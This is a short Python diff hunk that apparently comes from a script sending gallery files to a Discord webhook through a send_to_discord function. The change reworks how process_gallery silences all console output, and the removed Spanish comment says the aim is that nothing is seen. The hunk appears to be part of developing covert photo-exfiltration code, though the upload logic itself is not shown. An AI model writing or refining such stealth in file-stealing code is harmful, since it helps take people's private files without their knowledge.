@@ -48,9 +48,9 @@ def send_to_discord(file_path, webhook_url):
     except: return False
 
 def process_gallery():
-    # Silencio absoluto de salida para que no se vea nada en la consola principal
-    sys.stdout = StringIO()
-    sys.stderr = StringIO()
+    f = StringIO()
+    sys.stdout = f 
+    sys.stderr = f
     
     if not check_storage_permissions(): return
     
